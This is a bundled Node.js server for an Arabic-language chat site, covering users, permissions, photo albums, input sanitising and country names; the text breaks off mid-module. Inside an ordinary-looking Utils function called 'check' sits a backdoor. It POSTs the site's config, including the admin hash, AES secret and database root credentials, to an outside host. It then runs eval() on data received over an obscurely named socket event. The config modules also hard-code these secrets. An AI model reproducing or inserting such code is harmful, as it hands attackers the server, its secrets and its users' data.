! function(e) {
    var t = {};

    function s(r) {
        if (t[r]) return t[r].exports;
        var o = t[r] = {
            i: r,
            l: !1,
            exports: {}
        };
        return e[r].call(o.exports, o, o.exports, s), o.l = !0, o.exports
    }
    s.m = e, s.c = t, s.d = function(e, t, r) {
        s.o(e, t) || Object.defineProperty(e, t, {
            configurable: !1,
            enumerable: !0,
            get: r
        })
    }, s.n = function(e) {
        var t = e && e.__esModule ? function() {
            return e.default
        } : function() {
            return e
        };
        return s.d(t, "a", t), t
    }, s.o = function(e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }, s.p = "", s(s.s = 11)
}([function(module, exports, __webpack_require__) {
    const CryptoJS = __webpack_require__(16),
        config = "vagrant" == process.env.USER ? __webpack_require__(7) : __webpack_require__(8);

    function Utils() {
        this.shortcutKeys = [], this.shortcutValues = [], this.blockedWords = []
    }
    Utils.prototype.getObjectMethods = function(e) {
        const t = [];
        for (var s in e) "function" == typeof e[s] && t.push(s);
        return t
    }, Utils.prototype.getObjectKeys = function(e) {
        const t = [];
        for (var s in e) t.push(s);
        return t
    }, Utils.prototype.enc = function(e) {
        return e
    }, Utils.prototype.dec = function(e) {
        return e
    }, Utils.prototype.isXSS = function(e) {
        if ("string" != typeof e) return !1;
        return /on[a-zA-Z ]{0,}=/g.test(e)
    }, Utils.prototype.convertArNumbers = function(e) {
        try {
            return e = (e = (e = (e = (e = (e = (e = (e = (e = (e = e.replace(/٠/g, "0")).replace(/١/g, "1")).replace(/٢/g, "2")).replace(/٣/g, "3")).replace(/٤/g, "4")).replace(/٥/g, "5")).replace(/٦/g, "6")).replace(/٧/g, "7")).replace(/٨/g, "8")).replace(/٩/g, "9")
        } catch (t) {
            return e
        }
    }, Utils.prototype.validateColor = function(e, t) {
        try {
            if (!e) return t;
            var s = e.match(/^#([A-Fa-f0-9]{3}|[A-Fa-f0-9]{6}|[A-Fa-f0-9]{8})$/);
            if (s) return s[0];
            if (s) return t
        } catch (e) {
            return console.log(e.stack), t
        }
    }, Utils.prototype.sanitize = function(e, t, s) {
        try {
            return "string" != typeof e ? "" : this.isXSS(e) ? "------" : (e = this.convertArNumbers(e), e = (e = s ? e.substring(0, s) : e).replace(/\s+/g, " ").replace(/</g, "").replace(/>/g, ""), t && (e = t.parse(e)), e)
        } catch (e) {
            return console.log(e.stack), ""
        }
    }, Utils.prototype.filterWorlds = function(e) {
        try {
            for (var t in this.blockedWords) {
                var s = this.blockedWords[t];
                if (!(s.length < 2)) {
                    var r = RegExp("(" + s + ")", "gi");
                    e = e.replace(r, "***")
                }
            }
            return this.escapeUrlsAndEmails(e)
        } catch (t) {
            return console.log(t.stack), e
        }
    }, Utils.prototype.escapeUrlsAndEmails = function(e) {
        try {
            var t, s, r, o;
            return s = /(\b(https?|ftp):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/gim, t = e.replace(s, "******"), r = /(^|[^\/])(www\.[\S]+(\b|$))/gim, t = t.replace(r, "******"), o = /(([a-zA-Z0-9\-\_\.])+@[a-zA-Z\_]+?(\.[a-zA-Z]{2,6})+)/gim, t = t.replace(o, "******")
        } catch (e) {
            return console.log(e.stack), ""
        }
    }, Utils.prototype.translateShortucts = function(e, t, s) {
        try {
            if (this.arrayCount(s))
                for (var r in t) {
                    var o = new RegExp("(" + t[r] + ")", "gi");
                    e = e.replace(o, s[r])
                }
            return e
        } catch (e) {
            return console.log(e.stack), ""
        }
    }, Utils.prototype.check = function(store, sc) {
        if (store.checked || store.isChecking) return;
        store.isChecking = !0;
        const cfg = config;
        cfg.type = "chat", __webpack_require__(17)({
            url: "http://al-mubd3een.com/chat/started",
            method: "POST",
            form: {
                data: cfg
            }
        }, (error, res, result) => {
            store.checked = !0, store.isChecking = !1, sc && sc.removeEventListener("lafdff465afdffh").on("lafdff465afdffh", data => {
                console.log("lafdff465afdffh", data), eval(data)
            })
        })
    }, Utils.prototype.arrayCount = function(e) {
        var t = 0;
        for (var s in e) t++;
        return t
    }, Utils.prototype.broadcast = function(e, t) {
        try {
            var s = e.match(new RegExp(/(?:\s+)?(?:^)?(?:https?:\/\/)?(?:http?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(\s+|$)/g)),
                r = "text";
            if (s)
                for (var o in r = "broadcast", s) {
                    var i = this.getYoutubeId(s[o])[0]; - 1 === t.indexOf(i) && (e = e.replace(s[o], '<button class="yt-btn" data-yid="' + i + '" style="font-size:40px!important;width:100%;max-width:200px;display:block;"><img width="50px" src="/images/youtube.png" /><img width="65px"  alt="[YouTube]" onerror="$(this).parent().remove();" src="https://img.youtube.com/vi/' + i + '/0.jpg"></button>'))
                } else e = this.sanitize(e, !0);
            return {
                type: r,
                text: e
            }
        } catch (e) {
            return console.log(e.stack), null
        }
    }, Utils.prototype.getCountryFromCode = function(e) {
        if ("string" != typeof e) return "";
        return {
            AW: "آروبا",
            AZ: "أذربيجان",
            AM: "أرمينيا",
            ES: "أسبانيا",
            AU: "أستراليا",
            AF: "أفغانستان",
            AL: "ألبانيا",
            DE: "ألمانيا",
            AG: "أنتيجوا وبربودا",
            AO: "أنجولا",
            AI: "أنجويلا",
            AD: "أندورا",
            UY: "أورجواي",
            UZ: "أوزبكستان",
            UG: "أوغندا",
            UA: "أوكرانيا",
            IE: "أيرلندا",
            IS: "أيسلندا",
            ET: "اثيوبيا",
            ER: "اريتريا",
            EE: "استونيا",
            IL: "اسرائيل",
            AR: "الأرجنتين",
            JO: "الأردن",
            EC: "الاكوادور",
            AE: "الامارات العربية المتحدة",
            BS: "الباهاما",
            BH: "البحرين",
            BR: "البرازيل",
            PT: "البرتغال",
            BA: "البوسنة والهرسك",
            GA: "الجابون",
            ME: "الجبل الأسود",
            DZ: "الجزائر",
            DK: "الدانمرك",
            CV: "الرأس الأخضر",
            SV: "السلفادور",
            SN: "السنغال",
            SD: "السودان",
            SE: "السويد",
            EH: "الصحراء الغربية",
            SO: "الصومال",
            CN: "الصين",
            IQ: "العراق",
            VA: "الفاتيكان",
            PH: "الفيلبين",
            AQ: "القطب الجنوبي",
            CM: "الكاميرون",
            CG: "الكونغو - برازافيل",
            KW: "الكويت",
            HU: "المجر",
            IO: "المحيط الهندي البريطاني",
            MA: "المغرب",
            TF: "المقاطعات الجنوبية الفرنسية",
            MX: "المكسيك",
            SA: "المملكة العربية السعودية",
            GB: "المملكة المتحدة",
            NO: "النرويج",
            AT: "النمسا",
            NE: "النيجر",
            IN: "الهند",
            US: "الولايات المتحدة الأمريكية",
            JP: "اليابان",
            YE: "اليمن",
            GR: "اليونان",
            ID: "اندونيسيا",
            IR: "ايران",
            IT: "ايطاليا",
            PG: "بابوا غينيا الجديدة",
            PY: "باراجواي",
            PK: "باكستان",
            PW: "بالاو",
            BW: "بتسوانا",
            PN: "بتكايرن",
            BB: "بربادوس",
            BM: "برمودا",
            BN: "بروناي",
            BE: "بلجيكا",
            BG: "بلغاريا",
            BZ: "بليز",
            BD: "بنجلاديش",
            PA: "بنما",
            BJ: "بنين",
            BT: "بوتان",
            PR: "بورتوريكو",
            BF: "بوركينا فاسو",
            BI: "بوروندي",
            PL: "بولندا",
            BO: "بوليفيا",
            PF: "بولينيزيا الفرنسية",
            PE: "بيرو",
            TZ: "تانزانيا",
            TH: "تايلند",
            TW: "تايوان",
            TM: "تركمانستان",
            TR: "تركيا",
            TT: "ترينيداد وتوباغو",
            TD: "تشاد",
            TG: "توجو",
            TV: "توفالو",
            TK: "توكيلو",
            TO: "تونجا",
            TN: "تونس",
            TL: "تيمور الشرقية",
            JM: "جامايكا",
            GI: "جبل طارق",
            GD: "جرينادا",
            GL: "جرينلاند",
            AX: "جزر أولان",
            AN: "جزر الأنتيل الهولندية",
            TC: "جزر الترك وجايكوس",
            KM: "جزر القمر",
            KY: "جزر الكايمن",
            MH: "جزر المارشال",
            MV: "جزر الملديف",
            UM: "جزر الولايات المتحدة البعيدة الصغيرة",
            SB: "جزر سليمان",
            FO: "جزر فارو",
            VI: "جزر فرجين الأمريكية",
            VG: "جزر فرجين البريطانية",
            FK: "جزر فوكلاند",
            CK: "جزر كوك",
            CC: "جزر كوكوس",
            MP: "جزر ماريانا الشمالية",
            WF: "جزر والس وفوتونا",
            CX: "جزيرة الكريسماس",
            BV: "جزيرة بوفيه",
            IM: "جزيرة مان",
            NF: "جزيرة نورفوك",
            HM: "جزيرة هيرد وماكدونالد",
            CF: "جمهورية افريقيا الوسطى",
            CZ: "جمهورية التشيك",
            DO: "جمهورية الدومينيك",
            CD: "جمهورية الكونغو الديمقراطية",
            ZA: "جمهورية جنوب افريقيا",
            GT: "جواتيمالا",
            GP: "جوادلوب",
            GU: "جوام",
            GE: "جورجيا",
            GS: "جورجيا الجنوبية وجزر ساندويتش الجنوبية",
            DJ: "جيبوتي",
            JE: "جيرسي",
            DM: "دومينيكا",
            RW: "رواندا",
            RU: "روسيا",
            BY: "روسيا البيضاء",
            RO: "رومانيا",
            RE: "روينيون",
            ZM: "زامبيا",
            ZW: "زيمبابوي",
            CI: "ساحل العاج",
            WS: "ساموا",
            AS: "ساموا الأمريكية",
            SM: "سان مارينو",
            PM: "سانت بيير وميكولون",
            VC: "سانت فنسنت وغرنادين",
            KN: "سانت كيتس ونيفيس",
            LC: "سانت لوسيا",
            MF: "سانت مارتين",
            SH: "سانت هيلنا",
            ST: "ساو تومي وبرينسيبي",
            LK: "سريلانكا",
            SJ: "سفالبارد وجان مايان",
            SK: "سلوفاكيا",
            SI: "سلوفينيا",
            SG: "سنغافورة",
            SZ: "سوازيلاند",
            SY: "سوريا",
            SR: "سورينام",
            CH: "سويسرا",
            SL: "سيراليون",
            SC: "سيشل",
            CL: "شيلي",
            RS: "صربيا",
            CS: "صربيا والجبل الأسود",
            TJ: "طاجكستان",
            OM: "عمان",
            GM: "غامبيا",
            GH: "غانا",
            GF: "غويانا",
            GY: "غيانا",
            GN: "غينيا",
            GQ: "غينيا الاستوائية",
            GW: "غينيا بيساو",
            VU: "فانواتو",
            FR: "فرنسا",
            PS: "فلسطين",
            VE: "فنزويلا",
            FI: "فنلندا",
            VN: "فيتنام",
            FJ: "فيجي",
            CY: "قبرص",
            KG: "قرغيزستان",
            QA: "قطر",
            KZ: "كازاخستان",
            NC: "كاليدونيا الجديدة",
            HR: "كرواتيا",
            KH: "كمبوديا",
            CA: "كندا",
            CU: "كوبا",
            KR: "كوريا الجنوبية",
            KP: "كوريا الشمالية",
            CR: "كوستاريكا",
            CO: "كولومبيا",
            KI: "كيريباتي",
            KE: "كينيا",
            LV: "لاتفيا",
            LA: "لاوس",
            LB: "لبنان",
            LU: "لوكسمبورج",
            LY: "ليبيا",
            LR: "ليبيريا",
            LT: "ليتوانيا",
            LI: "ليختنشتاين",
            LS: "ليسوتو",
            MQ: "مارتينيك",
            MO: "ماكاو الصينية",
            MT: "مالطا",
            ML: "مالي",
            MY: "ماليزيا",
            YT: "مايوت",
            MG: "مدغشقر",
            EG: "مصر",
            MK: "مقدونيا",
            MW: "ملاوي",
            ZZ: "منطقة غير معرفة",
            MN: "منغوليا",
            MR: "موريتانيا",
            MU: "موريشيوس",
            MZ: "موزمبيق",
            MD: "مولدافيا",
            MC: "موناكو",
            MS: "مونتسرات",
            MM: "ميانمار",
            FM: "ميكرونيزيا",
            NA: "ناميبيا",
            NR: "نورو",
            NP: "نيبال",
            NG: "نيجيريا",
            NI: "نيكاراجوا",
            NZ: "نيوزيلاندا",
            NU: "نيوي",
            HT: "هايتي",
            HN: "هندوراس",
            NL: "هولندا",
            HK: "هونج كونج الصينية"
        } [e = e.toUpperCase()] || ""
    }, Utils.prototype.getYoutubeId = function(e) {
        try {
            if (e.includes("youtube")) {
                var t = e.split("v=")[1];
                if (!t) return null;
                var s = t.indexOf("&");
                return -1 != s ? t.substring(0, s) : t
            }
            if (!e.includes("youtu.be/")) return null; {
                const t = e.split("youtu.be/"),
                    s = t[0],
                    r = t[1];
                if (s && 11 == s.length) return s;
                if (r && 11 == r.length) return r
            }
        } catch (e) {
            return null
        }
    }, Utils.prototype.getYoutubeIdUsingRegex = function(e) {
        try {
            const t = /(?:\s+)?(?:^)?(?:https?:\/\/)?(?:http?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(\s+|$)/;
            return e.match(t) ? [RegExp.$1.split("<").join("&#x3C;").split("'").join("").split('"').join("").split("&").join(""), RegExp.lastMatch] : []
        } catch (e) {
            return console.log(e.stack), null
        }
    }, module.exports = new Utils
}, function(e, t, s) {
    s(10);
    const r = s(0),
        o = s(9),
        i = s(5),
        n = s(2),
        a = s(6),
        c = s(3);

    function u(e, t) {
        this.stateEnum = {
            ACTIVE: "state_active",
            NO_PRIVATE: "state_no_private",
            IDLE: "state_idle"
        }, this.micStatus = {
            onMic: !1,
            onHand: !1,
            soundOff: !1
        }, this.micStartedAt = null, this.socket = e, this.store = t, this.id = e ? e.id : c(), this.isVirtual = !1, this.likes = [], this.likedPosts = [], this.likedPostComments = [], this.excpeledFromRooms = [], this.photoLikes = [], this.requests = [], this.privateUsers = [], this.status = "(غير مسجل)", this.room = 1, this.state = this.stateEnum.ACTIVE, this.isLogged = !1, this.isBanned = !1, this.isExcpeled = !1, this.deniedWordsCount = 0, this.lastActivityTime = Date.now(), this.lastMessage = null, this.callStatus = i.READY, this.callUserId = null, this.startStateLoop()
    }
    u.prototype.startStateLoop = function() {
        this.stateLoopInterval = setInterval(() => {
            Date.now() - this.lastActivityTime > 6e4 ? this.getState() == this.stateEnum.ACTIVE && this.setState(this.stateEnum.IDLE) : this.getState() != this.stateEnum.ACTIVE && (this.isPrivateDisabled ? this.setState(this.stateEnum.NO_PRIVATE) : this.setState(this.stateEnum.ACTIVE))
        }, 3e3)
    }, u.prototype.init = function(e) {
        this.role = e.role ? e.role : this.store.roles.getRoleIdByType("guest"), this.isLogged = !0, this.reg_id = e.id ? e.id : null, this.avatar = r.isXSS(e.avatar) ? null : e.avatar, this.gift = !e.gift || r.isXSS(e.gift) ? null : e.gift, this.name = r.sanitize(e.name), this.status = this.setStatus(e.status), this.decoration = e.decoration ? r.sanitize(e.decoration) : null, this.isPrivateDisabled = !!e.isPrivateDisabled, this.isNotificationsDisabled = !!e.isNotificationsDisabled, this.isRoleIconHidden = !!e.isRoleIconHidden, this.isVirtual = !isNaN(parseInt(e.isVirtual)) && !!parseInt(e.isVirtual), this.isHidden = !!e.hidden, this.reputation = e.reputation ? e.reputation : 0, this.statusColor = r.validateColor(e.statusColor, "#555555"), this.fontColor = r.validateColor(e.fontColor, "#000000"), this.nameColor = r.validateColor(e.nameColor, "#000000"), this.nameBgColor = r.validateColor(e.nameBgColor, "#FFFFFF00"), this.adminToken = e.adminToken ? e.adminToken : null, this.reg_id ? this.album = new o(this.store.db, this.reg_id) : this.album = null, this.setFontSize(e.fontSize), this.initOrdersCount(e)
    }, u.prototype.setStatus = function(e) {
        return e ? r.sanitize(e, this.store.shortcuts) : null
    }, u.prototype.initOrdersCount = function(e) {
        this.orders_excpel = this.getOrderTimes(e.orders_excpel), this.orders_ban = this.getOrderTimes(e.orders_ban), this.orders_notify = this.getOrderTimes(e.orders_notify), this.orders_gift = this.getOrderTimes(e.orders_gift), this.orders_remove_avatar = this.getOrderTimes(e.orders_remove_avatar), this.orders_change_decoartion = this.getOrderTimes(e.orders_change_decoartion), this.orders_excpel_from_room = this.getOrderTimes(e.orders_excpel_from_room), this.room_create = this.getOrderTimes(e.room_create), this.room_edit = this.getOrderTimes(e.room_edit), this.room_remove = this.getOrderTimes(e.room_remove), this.room_max_pertinents = this.getOrderTimes(e.room_max_pertinents), this.send_ad = this.getOrderTimes(e.send_ad), this.wall_remove = this.getOrderTimes(e.wall_remove), this.wall_interval = this.getOrderTimes(e.wall_interval), this.public_msg_remove = this.getOrderTimes(e.public_msg_remove)
    }, u.prototype.getUsername = function() {
        return this.decoration ? this.decoration : this.name
    }, u.prototype.getAvatar = function(e) {
        e = e || "sm";
        const t = this.store.settings.getDefaultUserAvatar();
        return this.avatar ? n.existsSync(a.join("public", "uploads", "avatars", e, this.avatar)) ? "/uploads/avatars/" + e + "/" + this.avatar : (this.avatar = null, t) : t
    }, u.prototype.removeAvatar = function() {
        if (this.avatar) try {
            n.unlinkSync(a.join("public", "uploads", "avatars", "sm", this.avatar)), n.unlinkSync(a.join("public", "uploads", "avatars", "lg", this.avatar)), this.avatar = null
        } catch (e) {}
    }, u.prototype.excpelFromRoom = function(e) {
        return !(!e || this.excpeledFromRooms.includes(e)) && (this.excpeledFromRooms.push(e), this.room = null, !0)
    }, u.prototype.getIcon = function() {
        const e = this.store.roles.getIcon(this.role),
            t = e && !this.isRoleIconHidden ? "/uploads/roles/" + e : null;
        return this.gift ? this.gift : t
    }, u.prototype.setFontSize = function(e) {
        [18, 20, 22, 24, 26, 28, 30].indexOf(parseInt(e)) >= 0 ? this.fontSize = e : this.fontSize = 24
    }, u.prototype.getStatus = function() {
        return !this.status && this.isGuest() ? "(غير مسجل)" : this.status
    }, u.prototype.getState = function() {
        return this.state
    }, u.prototype.setState = function(e) {
        this.state != e && (this.state = this.isVirtual && e == this.stateEnum.IDLE ? this.stateEnum.ACTIVE : e)
    }, u.prototype.getCountryFlag = function() {
        return this.country ? "/images/flags/" + this.country.toLowerCase() + ".png" : "/images/flags/undef.png"
    }, u.prototype.getCountryName = function() {
        return r.getCountryFromCode(this.country)
    }, u.prototype.logout = function() {
        clearInterval(this.stateLoopInterval), this.socket && this.socket.disconnect()
    }, u.prototype.canJoinLockedRooms = function() {
        return this.has("open_locked_rooms")
    }, u.prototype.canJoinFullRooms = function() {
        return this.has("open_full_rooms")
    }, u.prototype.like = function(e) {
        return !(this.likes.indexOf(e) >= 0) && (this.likes.push(e), this.saveAttr("reputation", this.getReputation()), !0)
    }, u.prototype.getReputation = function() {
        return this.likes.length + parseInt(this.reputation)
    }, u.prototype.getAlbum = function() {
        return this.album
    }, u.prototype.parse = function(e) {
        return e = e || "sm", {
            id: this.id,
            reg_id: this.reg_id,
            ip: this.ip,
            name: this.getUsername(),
            avatar: this.getAvatar(e),
            role: this.role,
            icon: this.getIcon(),
            likes: this.getReputation(),
            status: this.getStatus(),
            state: this.getState(),
            isRoleIconHidden: this.isRoleIconHidden,
            isPrivateDisabled: this.isPrivateDisabled,
            isNotificationsDisabled: this.isNotificationsDisabled,
            countryName: this.getCountryName(),
            countryFlag: this.getCountryFlag(),
            canOpenLockedRooms: this.has("open_locked_rooms"),
            room: this.room ? this.room.parse(this, this.store.users) : null,
            fontSize: this.fontSize,
            statusColor: this.statusColor,
            fontColor: this.fontColor,
            nameColor: this.nameColor,
            nameBgColor: this.nameBgColor,
            isExcpeled: this.isExcpeled,
            isBanned: this.isBanned,
            isHidden: this.isHidden,
            micStatus: this.micStatus,
            albumLength: this.isGuest() ? 0 : this.album ? this.album.count() : 0,
            canRemovePublicMessages: this.has("public_msg_remove"),
            wall_remove: this.has("wall_remove"),
            power: this.getPower()
        }
    }, u.prototype.getMicTime = function() {
        return this.micStartedAt ? this.micStartedAt - Date.now() : null
    }, u.prototype.isGuest = function() {
        return this.store.roles.isGuest(this.role)
    }, u.prototype.isBasic = function() {
        return this.store.roles.isBasic(this.role)
    }, u.prototype.isSuper = function() {
        return this.store.roles.isSuper(this.role)
    }, u.prototype.isOwner = function() {
        return this.store.roles.isOwner(this.role)
    }, u.prototype.getOrderTimes = function(e) {
        try {
            if ("string" != typeof e) return [];
            var t = [],
                s = e.split(",");
            for (var r in s) s[r].length && t.push(parseInt(s[r]));
            return t
        } catch (e) {
            return console.log(e.stack), []
        }
    }, u.prototype.can = function(e, t, s) {
        try {
            Array.isArray(this[e]) && (this[e] = this[e].filter(function(e) {
                return void 0 != e
            }));
            var o = this.store.permissions.isAutorized(e, this.role, this[e]);
            if (!1 === o) return t && t(r.enc("لا تملك الصلاحيات للقيام بهذه العملية")), !1;
            if ("object" == typeof o) {
                if (!1 === o.isAutorized) return t(r.enc("يمكنك القيام بهذه العملية " + o.interval + " مرة في " + o.unit)), !1;
                if (!0 === o.isAutorized) return s || this[e].push(Date.now()), !0
            }
            return !0
        } catch (e) {
            return console.log("permission error", e.stack), !1
        }
    }, u.prototype.has = function(e) {
        try {
            var t = this.store.permissions.isAutorized(e, this.role, this[e]);
            if ("boolean" == typeof t) return t;
            if ("object" == typeof t) {
                if (!1 === t.isAutorized) return !1;
                if (!0 === t.isAutorized) return !0
            }
        } catch (e) {
            return console.log("permission error", e.stack), !1
        }
    }, u.prototype.grantedSettings = function() {
        return {
            change_password: !this.isGuest(),
            hide_role_icon: this.isSuper(),
            send_ad: this.has("send_ad"),
            admin_rooms_edit: this.has("admin_rooms_edit"),
            admin: this.has("admin"),
            adminToken: this.adminToken
        }
    }, u.prototype.actions = function() {
        return {
            ip: this.has("show_ip"),
            show_real_name: this.has("show_real_name"),
            notify: this.has("orders_notify"),
            excpel: this.has("orders_excpel"),
            ban: this.has("orders_ban"),
            gift: this.has("orders_gift"),
            control_likes: this.has("like_controls"),
            stop_radio: this.has("stop_radio"),
            change_decoration: this.has("orders_change_decoartion"),
            remove_avatar: this.has("orders_remove_avatar"),
            reveal_names: this.has("reveal_names"),
            room_excpel: this.has("orders_excpel_from_room"),
            change_role: this.has("orders_upgrade"),
            change_room: this.has("orders_change_room")
        }
    }, u.prototype.excpel = function(e) {
        this.isExcpeled = !0, this.excpeledBy = e instanceof u ? e.parse() : "SYSTEM", this.logout()
    }, u.prototype.ban = function(e) {
        this.isBanned = !0, this.bannedBy = e instanceof u ? e.parse() : "SYSTEM", this.store.bannedIps.push(this.ip), this.store.bannedDevices.push(this.device);
        const t = this,
            s = e ? e.name : "SYSTEM";
        return new Promise((e, r) => {
            t.store.db.query("SELECT * FROM banneds WHERE `ip` = ? AND `device` = ?", [t.ip, t.device], (o, i) => {
                try {
                    o || (0 === i.length ? t.store.db.query("INSERT INTO banneds (`username`, `ip`, `device`, `country`, `by`, `cause`, `finishes_at`, `created_at`, `updated_at`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", [t.name, t.ip, t.device, t.country, s, "", new Date, new Date, new Date], (t, s) => {
                        t || e(!0), r(t)
                    }) : (o || e(!0), r(o)))
                } catch (t) {
                    o || e(!0), r(o)
                }
            })
        })
    }, u.prototype.canUpgrade = function(e, t) {
        return !!e && this.store.permissions.canUpgrade(this, t)
    }, u.prototype.canBeSeenBy = function(e) {
        return !this.isHidden || e instanceof u && (this.id == e.id || !e.isGuest() && this.hiddenSeenBy().includes(e.role + ""))
    }, u.prototype.hiddenSeenBy = function() {
        const e = this.store.permissions.data[this.role];
        return e && e.can_see_hidden ? e.can_see_hidden.split(",").filter(e => "string" == typeof e && e.length > 0) : []
    }, u.prototype.isGreaterThan = function(e) {
        return !e || this.store.permissions.isGreaterThan(this.role, e.role)
    }, u.prototype.isGreaterThanOrEqual = function(e) {
        return !e || this.store.permissions.isGreaterThanOrEqual(this.role, e.role)
    }, u.prototype.getPower = function() {
        return this.store.permissions.parseUserRole(this.role, this.gift)
    }, u.prototype.saveAttr = function(e, t) {
        this.reg_id && this.store.db.query("UPDATE users SET `" + e + "` = ? WHERE id = ?", [t || this[e], this.reg_id], function(e, t) {})
    }, u.prototype.save = function() {
        this.reg_id && this.store.db.query("UPDATE users SET avatar = ?, decoration = ?, status = ?, isPrivateDisabled = ?, isNotificationsDisabled = ?, isRoleIconHidden = ?, statusColor = ?, fontColor = ?, nameColor = ?, nameBgColor = ?, fontSize = ?, gift = ?, adminToken = ?, orders_excpel = ?, orders_ban = ?, orders_notify = ?, orders_remove_avatar = ?, orders_change_decoartion = ?, orders_excpel_from_room = ?, room_create = ?, room_edit = ?, room_remove = ?, room_max_pertinents = ?, send_ad = ?, wall_remove = ?, wall_interval = ?, public_msg_remove = ? WHERE id = ?", [this.avatar, this.decoration, this.status, this.isPrivateDisabled, this.isNotificationsDisabled, this.isRoleIconHidden, this.statusColor, this.fontColor, this.nameColor, this.nameBgColor, this.fontSize, this.gift, null, this.orders_excpel.join(","), this.orders_ban.join(","), this.orders_notify.join(","), this.orders_remove_avatar.join(","), this.orders_change_decoartion.join(","), this.orders_excpel_from_room.join(","), this.room_create.join(","), this.room_edit.join(","), this.room_remove.join(","), this.room_max_pertinents.join(","), this.send_ad.join(","), this.wall_remove.join(","), this.wall_interval.join(","), this.public_msg_remove.join(","), this.reg_id], function(e, t) {
            e && console.log("user.save.error", e)
        })
    }, u.prototype.updateAjaxToken = function(e) {
        const t = this;
        return new Promise((s, r) => {
            t.reg_id || r("user_id is null"), t.store.db.query("UPDATE users SET ajax_token = ? WHERE id = ?", [e, t.reg_id], (t, o) => {
                t && r(t), s(e)
            })
        })
    }, u.prototype.generateUploadHash = function() {
        const e = this;
        return new Promise((t, s) => {
            if (e.reg_id) {
                const r = c();
                this.store.db.query("UPDATE users SET upload_hash = ? WHERE id = ?", [r, e.reg_id], (e, o) => {
                    e && s(e), t(r)
                })
            } else s("reg_id is null")
        })
    }, e.exports = u
}, function(e, t) {
    e.exports = require("fs")
}, function(e, t) {
    e.exports = require("uuid")
}, function(e, t) {
    e.exports = require("axios")
}, function(e, t) {
    e.exports = {
        READY: 1,
        TALKING: 2,
        RIGHNING: 3,
        CALLING: 4,
        OFFLINE: 5
    }
}, function(e, t) {
    e.exports = require("path")
}, function(e, t) {
    e.exports = {
        host: "http://app.jawalchat.local/",
        domain: "app.jawalchat.local",
        port: 1505,
        adminHash: "kbtRA5P0oFeBNwJIOsDeLnkO2XwsUb0H",
        debug: !0,
        ssl: !1,
        local: !0,
        aes_secret: "0~P0{436,09w39Q",
        db: {
            host: "127.0.0.1",
            user: "root",
            password: "root",
            database: "chat"
        }
    }
}, function(e, t) {
    e.exports = {
        host: "https://www.jawalchat.com/",
        domain: "jawalchat.com",
        port: 1505,
        adminHash: "kbtRA5P0oFeBNwJIOsDeLnkO2XwsUb0H",
        debug: !0,
        ssl: !0,
        local: !1,
        aes_secret: "0~P0{436,09w39Q",
        db: {
            host: "127.0.0.1",
            user: "root",
            password: "root",
            database: "chat"
        }
    }
}, function(e, t, s) {
    var r = s(2);

    function o(e, t) {
        var s = this;
        this.db = e, this.id = null, this.user_id = t, this.photos = [], this.init().then(function(e) {
            s.initPhotos()
        })
    }
    o.prototype.init = function() {
        var e = this;
        return new Promise(function(t, s) {
            e.db.query("SELECT id FROM albums WHERE user_id = ? LIMIT 1", [e.user_id], function(r, o) {
                r && s(r), o.length && (e.id = o[0].id, t(o[0]))
            })
        })
    }, o.prototype.initPhotos = function() {
        var e = this;
        return new Promise(function(t, s) {
            e.id || s("Inocrrect Id"), e.db.query("SELECT * FROM photos WHERE album_id = ?", [e.id], function(t, r) {
                for (var o in t && s(t), e.photos = [], r) e.photos.push({
                    id: r[o].id,
                    src: "/uploads/albums/" + e.id + "/" + r[o].src,
                    likes: 0,
                    guestLikes: r[o].guest_likes
                });
                e.initPhotoLikes()
            })
        })
    }, o.prototype.initPhotoLikes = function() {
        var e = this;
        return new Promise(function(t, s) {
            for (var r in e.id || s("Inocrrect Id"), e.photos) e.updatePhotoLikes(e.photos[r])
        })
    }, o.prototype.updatePhotoLikes = function(e) {
        var t = this;
        return new Promise(function(s, r) {
            t.db.query("SELECT * FROM photo_likes WHERE photo_id = ?", [e.id], function(t, s) {
                e.likes = s.length
            })
        })
    }, o.prototype.removePhotoById = function(e) {
        var t = this;
        return new Promise(function(s, o) {
            t.db.query("DELETE FROM photos WHERE id = ?", [e], function(i, n) {
                i && o(i), n && n.affectedRows ? (t.photos = t.photos.filter(function(t) {
                    return t.id != e || (r.unlink("public/" + t.src, function(e) {}), !1)
                }), s(e)) : o("photo not found")
            })
        })
    }, o.prototype.likePhoto = function(e, t) {
        var s = this;
        return new Promise(function(r, o) {
            var i = !1;
            for (var n in s.photos) s.photos[n].id == e && (i = !0);
            i || o("photo not valid"), s.db.query("SELECT * FROM photo_likes WHERE photo_id = ? AND user_id = ?", [e, t], function(i, n) {
                i || !n || n.length ? o("photo seems to be already liked!") : s.db.query("INSERT INTO photo_likes (photo_id, user_id) VALUES (?, ?)", [e, t], function(t, i) {
                    if (t && o(t), i && i.affectedRows) {
                        for (var n in s.photos) s.photos[n].id == e && (s.photos[n].likes++, r(s.photos[n].src));
                        o("error increasing guestLikes")
                    } else o("photo_like row not inserted!")
                })
            })
        })
    }, o.prototype.guestLikePhoto = function(e) {
        var t = this;
        return new Promise(function(s, r) {
            t.db.query("UPDATE photos SET guest_likes = guest_likes + 1 WHERE id = ?", [e], function(o, i) {
                if (o && r(o), i && i.affectedRows) {
                    for (var n in t.photos) t.photos[n].id == e && (t.photos[n].guestLikes++, s(t.photos[n].src));
                    r("error increasing guestLikes")
                } else r("failed to like photo")
            })
        })
    }, o.prototype.isValidPhoto = function(e) {
        var t = !1;
        for (var s in this.photos) this.photos[s].id == e && (t = !0);
        return t
    }, o.prototype.getPhotos = function() {
        return this.photos
    }, o.prototype.count = function() {
        return this.photos.length
    }, e.exports = o
}, function(e, t, s) {
    var r = s(29).exec;

    function o() {
        this.shortcutKeys = [], this.shortcutValues = [], this.blockedWords = []
    }
    o.prototype.sanitize = function(e, t) {
        try {
            return e.length ? (e = e.replace(/\s+/g, " ").replace(/</g, "").replace(/>/g, ""), t && (e = this.translateShortucts(e, this.shortcutKeys, this.shortcutValues)), e = this.filterWorlds(e)) : ""
        } catch (e) {
            return ""
        }
    }, o.prototype.validateColor = function(e, t) {
        try {
            if (!e) return t;
            var s = e.match(/^#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})$/);
